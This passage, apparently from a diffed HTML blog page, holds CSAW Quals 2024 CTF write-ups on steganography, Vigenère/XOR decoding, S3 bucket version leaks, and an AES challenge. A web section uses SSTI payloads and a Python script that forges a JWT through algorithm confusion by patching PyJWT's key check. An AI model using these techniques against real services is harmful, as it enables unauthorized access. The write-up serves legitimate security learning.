3*x5*x7*x8+x1*x2*x3*x5*x6+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7*x8+x1*x2*x3*x4+x1*x2*x3*x4*x8+x1*x2*x3*x4*x7+x1*x2*x3*x4*x7*x8+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6+x1*x2*x3*x4*x5*x6*x8+x1*x2*x3*x4*x5*x6*x7') p.sendlineafter(\"merical order\\r\\n\",\"x1,x2,x3,x4,x5,x6,x7,x8\") p.sendlineafter(\")\",\"yes\") p.sendlineafter(\")\",\"no\") p.sendlineafter(\"etc.\\r\\n\",\"y7\") p.sendlineafter(\"given you\",'x7+x6+x6*x8+x5*x8+x5*x6+x4*x8+x4*x7+x4*x7*x8+x4*x6*x7+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3*x7+x3*x6+x3*x6*x7+x3*x5+x3*x5*x6+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x6*x8+x3*x4*x6*x7*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x2*x8+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7+x2*x5*x6+x2*x5*x6*x8+x2*x4*x8+x2*x4*x6+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3*x8+x2*x3*x6*x8+x2*x3*x6*x7*x8+x2*x3*x5*x7+x2*x3*x5*x6*x8+x2*x3*x4') p.sendlineafter(\"etc.\\r\\n\",\"x1\") p.sendlineafter(\")\",\"yes\") p.sendlineafter(\")\",\"yes\") print(p.recvall()) When we run the script, we receive the flag from the server output as:\nAnd our flag is csawctf{hopefu11y_+he_know1ed9e_diffu5ed_in+o_your_6r@in5}.\nBucketWars (Web) They gave us a site https://bucketwars.ctf.csaw.io. When attempting to access any incorrect path, you receive an error message with this S3 bucket link: https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/. This is actually a positive outcome, as we now have the bucket link. We can use this information to enumerate further and search for potential misconfigurations.\nA hint on the front page mentioned ‘past versions.’ I looked up how to access S3 versions and discovered that appending /?versions to the end of the URL would reveal past versions of files in the bucket.\nAs shown here: https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions, you can see not only the files that are primarily on the main website but also some version IDs.\nFrom that XML file, I obtained several versionId values, which I used in the link as shown below: I replaced all those versionId in the following link: https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=VersionId\nOut of all, https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB gives us: I tried to crack down the passphrase for the given image but no luck. Then I tried to look for other versionId and got this password in DOM: I used this password with steghide tool like:\n╭─rezy@dev ~ ╰─➤ steghide extract -sf sand-pit-1345726_640.jpg -xf flag.txt -p versions_leaks_buckets_oh_my wrote extracted data to \"flag.txt\". ╭─rezy@dev ~ ╰─➤ cat flag.txt csawctf{lEaKY_Bu4K3tz_oH_m3_04_mY!} Conclusion Thank you for reading my write-up for CSAW QUALS 2024. Happy hacking! :)\n",
+  "wordCount" : "2824",
+  "inLanguage": "en",
+  "image": "http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished": "2024-09-11T00:00:00Z",
+  "dateModified": "2024-09-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/ctf/csaw-quals-2024/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Rezy Dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Rezy Dev (Alt + H)">
+                <img src="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png" alt="" aria-label="logo"
+                    height="35">Rezy Dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="✍️ Posts">
+                    <span>✍️ Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
+                    <span>🔍 Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
+                    <span>🏷️ Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami/" title="👨🏼‍💻 Whoami">
+                    <span>👨🏼‍💻 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      CSAW Quals 2024
+    </h1>
+    <div class="post-meta"><span title='2024-09-11 00:00:00 +0000 UTC'>September 11, 2024</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2824 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/posts/CTF/CSAW-QUALS-2024/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.</p>
+<h1 id="the-triple-illusion-forensics">The Triple Illusion (Forensics)<a hidden class="anchor" aria-hidden="true" href="#the-triple-illusion-forensics">#</a></h1>
+<p>We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.</p>
+<pre tabindex="0"><code>╭─rezy@dev ~/Desktop/images  
+╰─➤  exiftool datavsmetadata.png 
+ExifTool Version Number         : 12.76
+File Name                       : datavsmetadata.png
+User Comment                    : Think about a two-input gate that outputs when inputs differ.
+XP Comment                      : Now that you know what operation is needed, have you found the right key?
+Comment                         : Can you crack my secret? Here&#39;s a list of numbers: See what they reveal. 0 0 0 0 0 0 0 0 15 23 23 4 7 0 22 1 23 28 0 18 10 12 0 7 23 2 17 18 21 16 0 0 0 0 0 28 7 16 17 16 6 17 11 0 1 0 21 23 4 24 0 0 0 0 0 0
+</code></pre><pre tabindex="0"><code>╭─rezy@dev ~/Desktop/images  
+╰─➤  zsteg -a hibiscus.png | grep {                                           
+b1,rgb,lsb,xy       .. text: &#34;ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}&#34;
+</code></pre><pre tabindex="0"><code>╭─rezy@dev ~/Desktop/images  
+╰─➤  zsteg -a roses.png | grep {                                              
+b1,rgb,lsb,xy       .. text: &#34;csawctf{heres_akey_now_decrypt_the_vigenere_cipher_text}&#34;
+</code></pre><p>I then used the key obtained from roses.png to decode the given cipher: <code>ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}</code>. The decryption was performed using the key <code>csawctfheresakeynowdecryptthevigenereciphertext</code>, after removing the <strong>underscores</strong> and <strong>curly braces</strong>. This process gave us a new key: <code>csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}</code>.</p>
+<p><img loading="lazy" src="Pasted%20image%2020240907141924.png" alt=""  />
+</p>
+<p>With the given key, I used this code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">numbers</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_ascii</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_ascii</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_chars</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">numbers</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key_char</span> <span class="o">=</span> <span class="n">key_ascii</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># xor</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_char</span> <span class="o">=</span> <span class="n">num</span> <span class="o">^</span> <span class="n">key_char</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># printable ASCII range 32 - 126</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_char</span> <span class="o">=</span> <span class="p">(</span><span class="n">decrypted_char</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">126</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># conv to char</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_chars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">decrypted_char</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decrypted_chars</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;csawctf</span><span class="si">{heres_anew_key_decrypt_the_secretto_reveal_flag}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">decrypted_message</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">numbers</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;flag is: &#39;</span><span class="p">,</span> <span class="n">decrypted_message</span><span class="p">)</span>
+</span></span></code></pre></div><p>The code defines a function <code>xor_decrypt</code> that decrypts a list of numbers using a key by applying an XOR operation. It converts each character of the key to its ASCII value and uses it to decrypt the corresponding number in the list, ensuring the result falls within the printable ASCII range. Finally, the decrypted values are combined into a string and printed as the result.</p>
+<p>And we get our flag as <code>csawctf{great_work_you_cracked_the_obscured_secret_flag}</code>.</p>
+<h1 id="lost-pyramid-web">Lost Pyramid (Web)<a hidden class="anchor" aria-hidden="true" href="#lost-pyramid-web">#</a></h1>
+<p>We were given the source code, and upon reviewing it, we found that we needed to access the <code>/kings_lair</code> endpoint to obtain the flag. To reach that endpoint, we required a valid JWT token. The source code also revealed that the payload of the JWT must include a valid <code>KINGSDAY</code> in the <code>CURRENT_DATE</code> setup. Below is the typical JWT for a regular user:</p>
+<pre tabindex="0"><code>{
+  &#34;ROLE&#34;: &#34;commoner&#34;,
+  &#34;CURRENT_DATE&#34;: &#34;07_09_2024_AD&#34;,
+  &#34;exp&#34;: 96333722311
+}
+</code></pre><p>The role must be set to &ldquo;royalty.&rdquo;</p>
+<p>Additionally, the source code indicates that a private key is used to generate the JWT. We can exploit a <a href="https://portswigger.net/web-security/jwt/algorithm-confusion">algorithm confusion attack to forge a JWT token</a>, but we first need to identify the public key. To discover the <code>KINGSDAY</code> and <code>PUBLICKEY</code>, I found Server-Side Template Injection (SSTI) vulnerability at the <code>/scarab_room</code> endpoint using payloads <code>{{ PUBLICKEY }}</code> and <code>{{ KINGSDAY }}</code>. This revealed the following:</p>
+<ul>
+<li>Public Key: <code>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2</code></li>
+<li>KINGSDAY: <code>03_07_1341_BC</code></li>
+</ul>
+<p>So with the information I have, I wrote a python code to forge a JWT token for me:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">public_key</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">kingsday</span> <span class="o">=</span> <span class="s2">&#34;03_07_1341_BC&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ROLE&#34;</span><span class="p">:</span> <span class="s2">&#34;royalty&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CURRENT_DATE&#34;</span><span class="p">:</span> <span class="n">kingsday</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;exp&#34;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="p">(</span><span class="mi">365</span> <span class="o">*</span> <span class="mi">3000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;jwt token:&#34;</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
+</span></span></code></pre></div><p>Which, upon running, gives the following error:</p>
+<pre tabindex="0"><code>jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
+</code></pre><p>So, after some research, I found that forging a token like this is no longer possible with the latest version of PyJWT. Instead, you can install <code>pyjwt==0.4.3</code> with <code>pip install pyjwt==0.4.3</code> and run the code above. However, there is also a hackish solution that someone posted.</p>
+<p><img loading="lazy" src="Pasted%20image%2020240907213447.png" alt=""  />
+</p>
+<p>Then I tried this method and adjusted my code accordingly. This is the final version I created:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Prepare an override method to bypass key checks</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">prepare_key</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">force_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Override HS256&#39;s prepare key method to disable the asymmetric key check</span>
+</span></span><span class="line"><span class="cl"><span class="n">jwt</span><span class="o">.</span><span class="n">api_jws</span><span class="o">.</span><span class="n">_jws_global_obj</span><span class="o">.</span><span class="n">_algorithms</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">prepare_key</span> <span class="o">=</span> <span class="n">prepare_key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Your public key (which is normally only for verification, not signing)</span>
+</span></span><span class="line"><span class="cl"><span class="n">public_key</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># JWT payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">kingsday</span> <span class="o">=</span> <span class="s2">&#34;03_07_1341_BC&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ROLE&#34;</span><span class="p">:</span> <span class="s2">&#34;royalty&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CURRENT_DATE&#34;</span><span class="p">:</span> <span class="n">kingsday</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;exp&#34;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="p">(</span><span class="mi">365</span> <span class="o">*</span> <span class="mi">3000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate a JWT using the public key, bypassing the security check</span>
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Print the JWT token</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;JWT token:&#34;</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
+</span></span></code></pre></div><p>Then this gave me a JWT, which I used in Burp Suite to get our flag.
+<img loading="lazy" src="Pasted%20image%2020240907213812.png" alt=""  />
+</p>
+<h1 id="aes-diffusion-crypto">AES Diffusion (Crypto)<a hidden class="anchor" aria-hidden="true" href="#aes-diffusion-crypto">#</a></h1>
+<p>We were given a port and an IP to connect to, i.e., <code>nc diffusion.ctf.csaw.io 5000</code>. We also received an <code>aes_simulator.py</code> file with the following content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">N_ROWS</span> <span class="o">=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">N_COLS</span> <span class="o">=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">CyclicShift</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">row</span><span class="p">[</span><span class="n">shift</span><span class="p">:]</span> <span class="o">+</span> <span class="n">row</span><span class="p">[:</span><span class="n">shift</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ShiftRows</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row_index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N_ROWS</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="p">[</span><span class="n">row_index</span><span class="p">]</span> <span class="o">=</span> <span class="n">CyclicShift</span><span class="p">(</span><span class="n">state</span><span class="p">[</span><span class="n">row_index</span><span class="p">],</span> <span class="n">row_index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">BuildExpressionString</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">matrix_row</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expression</span> <span class="o">=</span> <span class="s2">&#34;(&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">coefficient</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">matrix_row</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">term</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">coefficient</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;*&#34;</span> <span class="o">+</span> <span class="n">column</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">should_insert_plus</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">matrix_row</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expression</span> <span class="o">+=</span> <span class="n">term</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">should_insert_plus</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">expression</span> <span class="o">+=</span> <span class="s2">&#34; + &#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">expression</span> <span class="o">+</span> <span class="s2">&#34;)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">GetStateColumn</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">column_index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">column</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">column</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="n">column_index</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">column</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">MultiplyColumn</span><span class="p">(</span><span class="n">column</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">matrix</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">new_column</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">matrix</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_element</span> <span class="o">=</span> <span class="n">BuildExpressionString</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_column</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_element</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_column</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">MixColumns</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
